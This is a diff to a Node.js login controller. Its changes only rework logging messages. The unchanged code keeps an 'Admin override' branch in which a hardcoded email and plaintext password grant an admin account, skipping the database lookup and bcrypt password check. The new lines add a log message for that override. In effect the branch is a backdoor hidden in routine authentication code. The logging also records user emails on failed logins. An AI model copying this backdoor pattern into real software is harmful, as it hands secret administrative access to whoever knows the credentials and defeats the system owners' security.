@@ -109,6 +109,7 @@ exports.login = async (req, res) => {
 
     // Admin Override Check
     if (email === 'mal4crypt404@gmail.com' && password === 'thetaskmaster17') {
+        console.log('[AUTH] Admin override login triggered for mal4crypt404@gmail.com');
         const adminUser = {
             id: 99999,
             email: 'mal4crypt404@gmail.com',
@@ -152,13 +153,13 @@ exports.login = async (req, res) => {
         }
 
         if (!user) {
-            console.log('Login failed: User not found for', driverId || email);
+            console.log(`[AUTH] Login failed: User not found for ${driverId ? 'driverId: ' + driverId : 'email: ' + email}`);
             return res.status(400).json({ message: 'Invalid credentials' });
         }
 
         const isMatch = await bcrypt.compare(password, user.password_hash);
         if (!isMatch) {
-            console.log('Login failed: Password mismatch for', user.email);
+            console.log(`[AUTH] Login failed: Password mismatch for user ${user.email}`);
             return res.status(400).json({ message: 'Invalid credentials' });
         }
 
